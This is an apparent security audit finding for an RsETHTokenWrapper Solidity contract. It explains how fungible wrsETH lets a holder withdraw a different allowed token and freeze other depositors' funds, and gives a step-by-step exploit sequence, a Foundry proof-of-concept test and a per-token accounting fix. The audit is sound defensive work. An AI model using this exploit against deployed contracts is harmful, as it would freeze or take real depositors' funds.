Audit Report

## Title
Cross-Token Withdrawal Drains Specific Token Balance, Temporarily Freezing Depositor Funds - (File: `contracts/L2/RsETHTokenWrapper.sol`)

## Summary
`RsETHTokenWrapper` mints a single fungible `wrsETH` token 1:1 for any allowed token deposited, but permits withdrawal of **any** allowed token against that fungible balance with no per-token accounting. Once a second allowed token is added (an intended production feature via `reinitialize` or `addAllowedToken`), any `wrsETH` holder can drain the contract's reserves of a specific token, leaving depositors of that token unable to withdraw their funds.

## Finding Description
`_deposit` (L134–141) accepts any `allowedTokens[_asset]` token, transfers it in, and mints `wrsETH` 1:1 with no record of which token was deposited:

```solidity
function _deposit(address _asset, address _to, uint256 _amount) internal {
    if (!allowedTokens[_asset]) revert TokenNotAllowed();
    ERC20Upgradeable(_asset).safeTransferFrom(msg.sender, address(this), _amount);
    _mint(_to, _amount);
    ...
}
```

`_withdraw` (L120–128) only checks `allowedTokens[_asset]`, then burns `wrsETH` and transfers the **caller-chosen** token — again with no per-token accounting:

```solidity
function _withdraw(address _asset, address _to, uint256 _amount) internal {
    if (!allowedTokens[_asset]) revert TokenNotAllowed();
    _burn(msg.sender, _amount);
    ERC20Upgradeable(_asset).safeTransfer(_to, _amount);
    ...
}
```

Because `wrsETH` is fungible across all deposited token types, any holder can redeem against any allowed token's balance regardless of what they originally deposited. The `allowedTokens` mapping (L24) is a simple `bool` with no balance tracking. The multi-token path is an intended production feature: `reinitialize` (L47–49) was specifically added to introduce a second allowed token, and `addAllowedToken` (L174–176) is a live admin function.

Exploit sequence once two tokens are allowed:
1. `userB.deposit(tokenB, N)` → wrapper holds N tokenB; userB holds N wrsETH
2. `userA.deposit(tokenA, N)` → wrapper holds N tokenA + N tokenB; total wrsETH = 2N
3. `userA.withdraw(tokenB, N)` → **succeeds**: burns N wrsETH, transfers N tokenB out; wrapper now holds N tokenA, 0 tokenB
4. `userB.withdraw(tokenB, N)` → **reverts**: `safeTransfer` fails, 0 tokenB in contract

No existing check prevents step 3. The only guard in `_withdraw` is the `allowedTokens` check, which passes for tokenB.

## Impact Explanation
**Medium — Temporary freezing of funds.** User B's N tokenB is inaccessible via the intended withdrawal path. While user B could theoretically call `withdraw(tokenA, N)`, the two alt-rsETH tokens may trade at different rates, so this is not a guaranteed equivalent recovery. The protocol's 1:1 deposit/withdraw promise for the specific deposited token is broken without admin intervention (depositing more tokenB to restore balance). This matches the allowed impact: *Medium. Temporary freezing of funds.*

## Likelihood Explanation
**Medium.** The multi-token path is an intended production feature — `reinitialize` was explicitly added to introduce a second allowed token. Once two tokens are allowed, any `wrsETH` holder (including a rational arbitrageur) has direct economic incentive to exploit this if one allowed token trades at a premium to another. The attacker requires no special privileges beyond holding `wrsETH` and calling the public `withdraw` function.

## Recommendation
Track per-token net deposits and enforce that withdrawals of a given token cannot exceed that token's net deposit balance:

```solidity
mapping(address => uint256) public tokenNetDeposits;

// in _deposit:
tokenNetDeposits[_asset] += _amount;

// in _withdraw:
require(tokenNetDeposits[_asset] >= _amount, "Insufficient per-token balance");
tokenNetDeposits[_asset] -= _amount;
```

Alternatively, restrict the wrapper to a single canonical token and disallow multi-token support, or issue separate wrapper tokens per deposited asset.

## Proof of Concept

```solidity
function testCrossTokenDrain() public {
    // Admin adds tokenB as a second allowed token
    wrapper.addAllowedToken(address(tokenB));

    // userB deposits N tokenB
    tokenB.mint(userB, N);
    vm.prank(userB); tokenB.approve(address(wrapper), N);
    vm.prank(userB); wrapper.deposit(address(tokenB), N);
    // wrapper: N tokenB; wrsETH supply: N (userB holds N)

    // userA deposits N tokenA
    tokenA.mint(userA, N);
    vm.prank(userA); tokenA.approve(address(wrapper), N);
    vm.prank(userA); wrapper.deposit(address(tokenA), N);
    // wrapper: N tokenA, N tokenB; wrsETH supply: 2N

    // userA cross-token drains tokenB
    vm.prank(userA);
    wrapper.withdraw(address(tokenB), N); // succeeds
    // wrapper: N tokenA, 0 tokenB; wrsETH supply: N (userB still holds N)

    // userB cannot withdraw their tokenB
    vm.prank(userB);
    vm.expectRevert();
    wrapper.withdraw(address(tokenB), N); // reverts: ERC20 transfer amount exceeds balance

    // Invariant broken
    assertGe(tokenB.balanceOf(address(wrapper)), N); // FAILS: actual = 0
}
```
